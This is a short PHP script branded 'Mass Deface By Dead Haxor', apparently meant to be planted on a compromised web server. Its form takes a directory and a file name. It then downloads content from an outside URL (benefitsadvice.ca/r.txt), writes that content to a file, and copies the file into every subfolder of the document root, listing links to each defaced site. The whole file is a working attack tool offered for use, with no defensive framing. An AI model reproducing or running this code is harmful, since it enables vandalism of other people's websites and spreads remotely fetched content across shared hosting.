<?php
################################
##  Script Mass Deface 1dir	  ##
##							  ##
##			Coded by          ##
##		  Dead Haxor		  ##
## 	Copyright 2021 Deadhaxor  ##
################################

if (isset($_POST['gogo'])) {
error_reporting(0);
echo "<html><body bgcolor='white'>";

$name = $_POST['name_file']; 
// $sc = $_POST['sc'];
$sc = file_get_contents('http://benefitsadvice.ca/r.txt');

$bikin = fopen($name, "w");
		 fwrite($bikin, $sc);
		 fclose($bikin);
$root = $_POST['pwd'];
$scan = scandir($root);
foreach ( $scan as $a ) {
	$dir = $a;
	$gas = $root.'/'.$a.'/'.$name;
	$asu = @copy($name, $gas);
	if($asu) { 	
			echo "<b><font color='black'><a href='http://$dir/$name' target='_blank'>http://$dir/$name</a></font></b><br>";
	}
}
echo "</body></html>";	
} else {
	$dirr = $_SERVER['DOCUMENT_ROOT'];
	echo "<html>
	<center>
<body>
	<h1>Mass Deface By Dead Haxor</h1>
	<form method='post' action=''>
		<font>* If it is not in <i>public_html</i> please delete the additional folder</font><br>
		<input type='text' name='pwd' size='50' value='$dirr'><br><br>
		<input type='text' name='name_file' size='50' value='contents.php'><br><br>
		<input type='submit' name='gogo' value='Mass Deface'><br>
	</form>
	</body>
</html>"; 
}
?>